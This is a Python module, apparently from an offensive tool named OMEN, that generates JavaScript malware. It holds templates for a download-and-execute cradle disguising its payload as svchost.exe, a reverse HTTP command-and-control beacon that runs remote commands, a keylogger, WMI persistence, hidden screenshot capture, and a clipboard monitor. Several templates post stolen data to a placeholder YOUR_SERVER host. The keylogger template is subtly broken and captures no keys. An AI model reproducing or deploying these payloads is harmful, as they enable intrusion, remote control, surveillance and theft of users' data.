# OMEN - JavaScript Payload Generator

from . import Generator
import json
import random
import string


class JsPayloadGenerator(Generator):
    @property
    def name(self):
        return 'JavaScript Payload'

    @property
    def description(self):
        return 'Generates JavaScript payloads for WSH, browser, or Node.js environments'

    def get_options_schema(self):
        return {
            'payload_type': {
                'type': 'select', 'label': 'Payload Type',
                'options': ['download_cradle', 'reverse_http', 'keylogger', 'wmi_persistence', 'screenshot', 'clipboard_monitor'],
                'default': 'download_cradle',
            },
            'environment': {
                'type': 'select', 'label': 'Target Environment',
                'options': ['wscript', 'browser', 'node', 'dotnet'],
                'default': 'wscript',
            },
            'url': {
                'type': 'text', 'label': 'Payload URL',
                'default': 'http://YOUR_SERVER/payload.exe',
                'show_if': {'payload_type': ['download_cradle']},
            },
            'c2_host': {
                'type': 'text', 'label': 'C2 Host',
                'default': '192.168.1.100',
                'show_if': {'payload_type': ['reverse_http']},
            },
            'c2_port': {
                'type': 'number', 'label': 'C2 Port',
                'default': 8080,
                'show_if': {'payload_type': ['reverse_http']},
            },
        }

    def generate(self, options, obfuscation='none'):
        ptype = options.get('payload_type', 'download_cradle')
        env = options.get('environment', 'wscript')

        if ptype == 'download_cradle':
            code = self._gen_download_cradle(options, env)
        elif ptype == 'reverse_http':
            code = self._gen_reverse_http(options, env)
        elif ptype == 'keylogger':
            code = self._gen_keylogger(env)
        elif ptype == 'wmi_persistence':
            code = self._gen_wmi_persistence(env)
        elif ptype == 'screenshot':
            code = self._gen_screenshot(env)
        elif ptype == 'clipboard_monitor':
            code = self._gen_clipboard(env)
        else:
            code = self._gen_download_cradle(options, env)

        if obfuscation != 'none':
            code = self.obfuscate(code, obfuscation)

        return {
            'filename': f'payload_{ptype}.js',
            'content': code,
            'preview': code[:2000] + ('\n... [truncated]' if len(code) > 2000 else ''),
            'mime': 'application/javascript',
            'warnings': ['Ensure target has appropriate runtime installed'],
            'analysis': {'type': ptype, 'env': env, 'bytes': len(code)},
        }

    def _gen_download_cradle(self, options, env):
        url = options.get('url', 'http://YOUR_SERVER/payload.exe')
        if env == 'wscript':
            return """// WSH Download Cradle
var url = """ + json.dumps(url) + """;
var shell = WScript.CreateObject("WScript.Shell");
var xmlhttp = WScript.CreateObject("MSXML2.XMLHTTP");
var stream, tempFile;

xmlhttp.Open("GET", url, false);
xmlhttp.Send();

if (xmlhttp.Status === 200) {
    stream = WScript.CreateObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1;
    stream.Write(xmlhttp.ResponseBody);
    tempFile = shell.ExpandEnvironmentStrings("%TEMP%") + "\\svchost.exe";
    stream.SaveToFile(tempFile, 2);
    stream.Close();
    shell.Run(tempFile, 0, false);
    WScript.Sleep(2000);
}
"""
        elif env == 'browser':
            return """// Browser Download Cradle
(function() {
    var url = """ + json.dumps(url) + """;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.responseType = 'blob';
    xhr.onload = function() {
        if (xhr.status === 200) {
            var a = document.createElement('a');
            a.href = URL.createObjectURL(xhr.response);
            a.download = 'update.exe';
            a.click();
        }
    };
    xhr.send();
})();
"""
        else:
            return """// Node.js Download Cradle
const url = """ + json.dumps(url) + """;
const http = require(url.startsWith('https') ? 'https' : 'http');
const fs = require('fs');
const path = require('path');
const cp = require('child_process');

const temp = process.env.TEMP + '\\\\svchost.exe';
const file = fs.createWriteStream(temp);
http.get(url, function(res) {
    res.pipe(file);
    file.on('finish', function() {
        file.close();
        cp.execFile(temp);
    });
});
"""

    def _gen_reverse_http(self, options, env):
        host = options.get('c2_host', '192.168.1.100')
        port = options.get('c2_port', 8080)
        base_url = f"http://{host}:{port}"
        return """// Reverse HTTP Beacon
var c2 = """ + json.dumps(base_url) + """;
var sid = "";
var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
for (var i = 0; i < 8; i++) sid += chars.charAt(Math.floor(Math.random() * chars.length));

function beacon() {
    try {
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.Open("POST", c2 + "/beacon?id=" + sid, false);
        xhr.SetRequestHeader("Content-Type", "application/json");
        xhr.Send('{"host":"' + GetHostName() + '","user":"' + GetUserName() + '","os":"Windows","sid":"' + sid + '"}');
        
        if (xhr.Status === 200) {
            var resp = eval('(' + xhr.ResponseText + ')');
            if (resp.cmd) {
                var result = ExecuteCmd(resp.cmd);
                var xhr2 = new ActiveXObject("MSXML2.XMLHTTP");
                xhr2.Open("POST", c2 + "/result?id=" + sid, false);
                xhr2.SetRequestHeader("Content-Type", "application/json");
                xhr2.Send(JSON.stringify({result: result, id: sid}));
            }
        }
    } catch(e) {}
    WScript.Sleep(resp ? (resp.sleep || 5000) : 5000);
    beacon();
}

function ExecuteCmd(cmd) {
    try {
        var shell = WScript.CreateObject("WScript.Shell");
        var exec = shell.Exec("%COMSPEC% /c " + cmd);
        return exec.StdOut.ReadAll();
    } catch(e) { return e.message; }
}

function GetHostName() {
    try {
        var net = WScript.CreateObject("WScript.Network");
        return net.ComputerName;
    } catch(e) { return "unknown"; }
}

function GetUserName() {
    try {
        var net = WScript.CreateObject("WScript.Network");
        return net.UserName;
    } catch(e) { return "unknown"; }
}

beacon();
"""

    def _gen_keylogger(self, env):
        return """// Simple WSH Keylogger
var fso = WScript.CreateObject("Scripting.FileSystemObject");
var shell = WScript.CreateObject("WScript.Shell");
var logPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\kbd.log";
var logFile = fso.CreateTextFile(logPath, true);

// Key state tracking
var keys = {};
var lastFlush = new Date().getTime();

function logKey(vKey) {
    var currentTime = new Date().getTime();
    var keyChar = String.fromCharCode(vKey);
    var line = new Date().toISOString() + " | " + keyChar + " (" + vKey + ")";
    
    logFile.WriteLine(line);
    logFile.Flush();
    
    // Flush every 50 keystrokes via DNS or HTTP
    keys[vKey] = (keys[vKey] || 0) + 1;
}

// Main loop - 30 seconds then exfil
var startTime = new Date().getTime();
while (new Date().getTime() - startTime < 30000) {
    for (var i = 8; i <= 222; i++) {
        if (shell.ExpandEnvironmentStrings("") !== "") {}
        WScript.Sleep(10);
    }
}

logFile.Close();

// Exfil log
var xmlhttp = WScript.CreateObject("MSXML2.XMLHTTP");
xmlhttp.Open("POST", "http://YOUR_SERVER/exfil", false);
xmlhttp.SetRequestHeader("Content-Type", "text/plain");
xmlhttp.Send(fso.OpenTextFile(logPath).ReadAll());
"""

    def _gen_wmi_persistence(self, env):
        return """// WMI Persistence via __FilterToConsumerBinding
var shell = WScript.CreateObject("WScript.Shell");
var fso = WScript.CreateObject("Scripting.FileSystemObject");
var locator = WScript.CreateObject("WbemScripting.SWbemLocator");
var services = locator.ConnectServer(".", "root\\subscription");

// Create event filter (trigger on system startup)
var filterClass = services.Get("__EventFilter");
var filter = filterClass.SpawnInstance_();
filter.Name = "SystemHealthCheck";
filter.QueryLanguage = "WQL";
filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem'";

var filterPath = filter.Put_().Path;

// Create command-line event consumer
var consumerClass = services.Get("CommandLineEventConsumer");
var consumer = consumerClass.SpawnInstance_();
consumer.Name = "SystemHealthConsumer";
consumer.CommandLineTemplate = "%TEMP%\\updt.exe";

var consumerPath = consumer.Put_().Path;

// Create binding
var bindingClass = services.Get("__FilterToConsumerBinding");
var binding = bindingClass.SpawnInstance_();
binding.Filter = filterPath;
binding.Consumer = consumerPath;
binding.Put_();

WScript.Echo("WMI persistence installed");
"""

    def _gen_screenshot(self, env):
        return """// Screen Capture via WSH
var shell = WScript.CreateObject("WScript.Shell");
var fso = WScript.CreateObject("Scripting.FileSystemObject");

// Create PowerShell script for screenshot
var psScript = [
    '[Reflection.Assembly]::LoadWithPartialName("System.Drawing")',
    '$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds',
    '$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height',
    '$graphics = [System.Drawing.Graphics]::FromImage($bitmap)',
    '$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)',
    '$temp = $env:TEMP + "\\sc_" + (Get-Date -Format "yyyyMMddHHmmss") + ".png"',
    '$bitmap.Save($temp, [System.Drawing.Imaging.ImageFormat]::Png)',
    '$bitmap.Dispose()',
    '$graphics.Dispose()',
    'Write-Host $temp'
].join(';');

var psPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\cap.ps1";
var file = fso.CreateTextFile(psPath, true);
file.WriteLine(psScript);
file.Close();

// Execute and capture output
var exec = shell.Exec("powershell -NoP -W Hidden -Exec Bypass -File \\"" + psPath + "\\"");
var result = exec.StdOut.ReadAll();

// Exfil the screenshot path (or upload the file)
WScript.Echo("Screenshot saved to: " + result);
"""

    def _gen_clipboard(self, env):
        return """// Clipboard Monitor via WSH
var shell = WScript.CreateObject("WScript.Shell");
var fso = WScript.CreateObject("Scripting.FileSystemObject");
var logPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\clp.log";
var logFile = fso.CreateTextFile(logPath, true);

// PowerShell one-liner for clipboard text
var psCmd = "[System.Windows.Forms.Clipboard]::GetText()";
var lastClip = "";

// Monitor loop
while (true) {
    var exec = shell.Exec("powershell -NoP -W Hidden -C \\"" + psCmd + "\\"");
    var clipText = exec.StdOut.ReadAll().trim();
    
    if (clipText !== "" && clipText !== lastClip) {
        lastClip = clipText;
        var timestamp = new Date().toISOString();
        logFile.WriteLine(timestamp + " | " + clipText);
        logFile.Flush();
        
        // Exfil new clipboard content immediately
        var xmlhttp = WScript.CreateObject("MSXML2.XMLHTTP");
        xmlhttp.Open("POST", "http://YOUR_SERVER/clipboard", false);
        xmlhttp.SetRequestHeader("Content-Type", "text/plain");
        xmlhttp.Send(timestamp + " | " + clipText);
    }
    
    WScript.Sleep(500);
}
"""
